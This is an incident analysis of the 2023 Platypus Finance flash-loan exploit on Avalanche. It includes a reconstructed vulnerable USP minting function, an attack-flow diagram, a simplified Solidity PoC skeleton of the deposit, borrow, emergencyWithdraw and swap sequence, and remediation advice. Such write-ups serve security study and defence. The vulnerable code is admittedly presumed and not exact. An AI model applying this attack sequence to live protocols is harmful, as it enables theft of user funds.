# Platypus Finance — Flash Loan USP Stablecoin Exploit Analysis

| Item | Details |
|------|------|
| **Date** | 2023-02-16 |
| **Protocol** | Platypus Finance |
| **Chain** | Avalanche |
| **Loss** | ~8.5M USD |
| **Attacker** | Unknown |
| **Attack Tx** | [0x1266a937...](https://snowtrace.io/tx/0x1266a937c2ccd970e5d7929021eed3ec593a95c68a99b4920c2efa226679b430) |
| **Vulnerable Contract** | Platypus USP Stablecoin Contract |
| **Root Cause** | USP minting did not cross-validate pool balance against actual collateral value, allowing over-issuance via a temporary large deposit |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/Platypus_exp.sol) |

---
## 1. Vulnerability Overview

Platypus Finance is an Avalanche-based stableswap AMM that issues its own stablecoin, USP. The attacker borrowed a large amount of USDC via an Aave flash loan, deposited it into the Platypus pool, then abused the `emergencyWithdraw` mechanism to mint USP without backing collateral, and swapped the USP for other stablecoins to extract funds.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable emergencyWithdraw or USP minting logic
interface PlatypusPool {
    function deposit(address token, uint256 amount, address to, uint256 deadline) external;
    function withdraw(address token, uint256 liquidity, uint256 minimumAmount, address to, uint256 deadline) external;
}

// Presumed vulnerability: missing collateral check
function borrowUSP(uint256 amount) external {
    // ❌ Callable while collateral value is inflated via flash loan
    uint256 collateralValue = getCollateralValue(msg.sender);
    require(collateralValue >= amount * COLLATERAL_RATIO / 100, "Undercollateralized");
    // Flash loan temporarily increases collateralValue → requirement satisfied
    _mint(msg.sender, amount);  // ❌ Collateral disappears after flash loan repayment
}

// ✅ Fix: prohibit deposit/withdrawal within the same block
function borrowUSP(uint256 amount) external {
    require(lastDepositBlock[msg.sender] < block.number, "Same block deposit");
    // ...
}
```

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: USP minting did not cross-validate pool balance against actual collateral value,
// allowing over-issuance via a temporary large deposit
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ Aave Flash Loan (borrow large amount of USDC)
  │
  ├─2─▶ Deposit USDC into Platypus pool
  │       → Receive LP tokens (collateral established)
  │
  ├─3─▶ Mint large amount of USP using LP tokens as collateral
  │       (over-mint USP against temporary collateral)
  │
  ├─4─▶ Instantly withdraw USDC via emergencyWithdraw()
  │       Collateral (LP tokens) burned, but USP remains
  │
  ├─5─▶ Swap USP → USDC/USDT (other stablecoins)
  │
  └─6─▶ Repay Aave flash loan → Net profit ~8.5M USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function executeAttack(uint256 flashAmount) internal {
    // 1. Deposit flash-loaned USDC into Platypus pool
    USDC.approve(address(platypusPool), flashAmount);
    platypusPool.deposit(address(USDC), flashAmount, address(this), block.timestamp);

    // 2. Mint large amount of USP using LP tokens as collateral
    // Collateral value = USDC just deposited (flash loan principal)
    uint256 uspAmount = calculateMaxUSP();
    platypus.borrowUSP(uspAmount);

    // 3. Instantly withdraw deposited USDC via emergencyWithdraw
    // Collateral LP tokens are burned, but USP remains intact
    platypusPool.emergencyWithdraw(/* params */);

    // 4. Swap USP for other stablecoins to realize profit
    swapUSPtoUSDC(uspAmount);

    // 5. Repay flash loan (repay with original USDC)
    USDC.transfer(aave, flashAmount + fee);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Flash Loan Collateral Bypass |
| **Attack Vector** | Flash Loan + emergencyWithdraw + USP Over-Minting |
| **Impact Scope** | USP stablecoin peg and liquidity |
| **DASP Classification** | Business Logic Flaw |
| **CWE** | CWE-840: Business Logic Errors |

## 6. Remediation Recommendations

1. **Prohibit same-block deposit/withdrawal**: Make it impossible to use deposits as collateral within the same transaction.
2. **Collateral validation on emergencyWithdraw**: Enforce USP collateral ratio even during emergency withdrawals.
3. **USP minting cap**: Set an upper limit on USP that can be minted in a single transaction.

## 7. Lessons Learned

- The combination of a stablecoin minting mechanism and an emergency withdrawal function must always be reviewed against flash loan scenarios.
- PeckShield and spreekaway swiftly analyzed this incident.
- Platypus suffered a similar attack again in October 2023 (Platypus03).